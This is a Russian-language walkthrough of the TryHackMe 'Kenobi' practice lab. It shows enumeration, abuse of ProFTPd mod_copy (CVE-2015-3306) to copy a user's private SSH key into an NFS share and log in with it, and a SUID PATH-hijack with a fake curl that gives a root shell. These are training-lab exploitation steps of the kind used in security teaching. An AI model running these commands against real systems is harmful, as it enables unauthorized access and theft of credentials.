# TryHackMe: Kenobi Writeup
Краткий разбор прохождения комнаты Kenobi на платформе TryHackMe. Лэб сфокусирован на эксплуатации уязвимостей в сетевых службах (Samba, ProFTPd) и повышении привилегий через некорректную конфигурацию SUID-бинарника.
---## 1. Разведка и поиск эксплойтов
Первичный анализ портов с помощью `nmap` показал наличие открытых системных служб:* **Port 445 (Samba)** — сетевые папки.* **Port 21 (ProFTPd 1.3.5)** — FTP-сервер.* **Port 111/2049 (RPC/NFS)** — служба сетевой файловой системы.

Скрипты `smb-enum-shares` определили наличие анонимного доступа к сетевой директории `anonymous`. При подключении через `smbclient` внутри был обнаружен файл `log.txt`, содержащий конфигурационную информацию сервера (включая генерацию SSH-ключей для пользователя `kenobi`).

Поиск по версии FTP-сервера (`ProFTPd 1.3.5`) выявил критическую уязвимость **CVE-2015-3306** (модуль `mod_copy`), которая позволяет неавторизованному пользователю копировать файлы внутри системы с помощью команд `SITE CPFR` и `SITE CPTO`. Эксплойты для автоматизации были найдены в `searchsploit`, но атака проводилась вручную.
---## 2. Получение первоначального доступа (Initial Access)
Используя уязвимость `mod_copy`, приватный SSH-ключ пользователя был скопирован из домашней директории в доступную для экспорта по сети папку:

1. Подключение к FTP и перенос ключа в `/var` (директория, которая монтируется через NFS):
   ```bash
   nc <target_ip> 21
   SITE CPFR /home/kenobi/.ssh/id_rsa
   SITE CPTO /var/tmp/id_rsa
   ```
2. Монтирование сетевой папки `/var` на атакующей машине Kali Linux:
   ```bash
   mkdir /mnt/kenobi_nfs
   mount -t nfs <target_ip>:/var /mnt/kenobi_nfs
   ```
3. Извлечение приватного ключа `id_rsa` на свою машину:
   ```bash
   cp /mnt/kenobi_nfs/tmp/id_rsa .
   chmod 600 id_rsa
   ```4. Подключение к целевому серверу по SSH под именем найденного пользователя:
   ```bash
   ssh -i id_rsa kenobi@<target_ip>
   ```5. Флаг пользователя успешно прочитан в домашней директории:
   ```bash
   cat /home/kenobi/user.txt
   ```
## 3. Повышение привилегий (Privilege Escalation до Root)
Для поиска векторов локального повышения привилегий был запущен сбор файлов с установленным SUID-битом (запуск от имени владельца-суперпользователя):```bash
find / -perm -u=s -type f 2>/dev/null
```

Среди стандартных утилит был обнаружен нестандартный кастомный бинарник:

/usr/bin/menu


### Анализ уязвимости бинарника:
При запуске программы первый пункт меню выполняет сетевой запрос через утилиту `curl`. Главная уязвимость заключается в том, что разработчики прописали относительный путь запуска (`curl`), а не абсолютный (`/usr/bin/curl`). Программа полагается на системную переменную окружения `$PATH`.

### Эксплуатация (Path Injection):
Поскольку мы можем контролировать переменную `$PATH` в рамках своей сессии, мы можем заставить систему запустить вредоносный файл вместо легитимного `curl` с правами `root`.

**Пошаговый процесс получения Root-шелл:**

1. Переходим в директорию, куда у обычного пользователя есть права на запись:
   ```bash
   cd /tmp
   ```
2. Создаем фальшивый файл `curl`, который при вызове сразу откроет командный интерпретатор:
   ```bash
   echo "/bin/sh" > curl
   ```
3. Выдаем файлу максимальные права на исполнение:
   ```bash
   chmod 777 curl
   ```
4. Подменяем переменную окружения `$PATH`, вынося папку `/tmp` на первое место в приоритете поиска системных команд:
   ```bash
   export PATH=/tmp:\$PATH
   ```
5. Запускаем уязвимый бинарник:
   ```bash
   /usr/bin/menu
   ```
6. Выбираем **Вариант 1**. Программа пытается выполнить команду `curl`, обращается к измененному `$PATH`, находит наш файл в `/tmp` и запускает его. Так как сам файл `menu` имел SUID-бит владельца `root`, запущенный `/bin/sh` мгновенно дает нам сессию суперпользователя.

Флаг администратора успешно получен:
```bash
id # Выведет uid=0(root)
cat /root/root.txt
```
